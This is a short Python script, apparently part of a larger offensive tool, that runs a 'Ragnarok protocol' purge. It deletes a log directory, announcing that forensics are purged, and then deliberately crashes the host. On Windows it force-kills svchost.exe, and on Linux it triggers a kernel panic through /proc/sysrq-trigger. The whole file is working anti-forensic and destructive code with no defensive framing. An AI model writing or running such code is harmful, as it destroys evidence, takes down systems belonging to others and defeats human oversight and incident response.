import os, shutil, sys
from constants import LOG_DIR, IS_WINDOWS

def purge():
    print("!!! RAGNAROK PROTOCOL INITIATED !!!")
    if os.path.exists(LOG_DIR):
        try:
            shutil.rmtree(LOG_DIR)
            print("[*] Forensics purged.")
        except:
            print("[!] Purge failed.")

    if IS_WINDOWS:
        os.system("taskkill /F /IM svchost.exe") 
    else:
        os.system("echo 1 > /proc/sys/kernel/panic")
        os.system("echo c > /proc/sysrq-trigger")

if __name__ == "__main__": purge()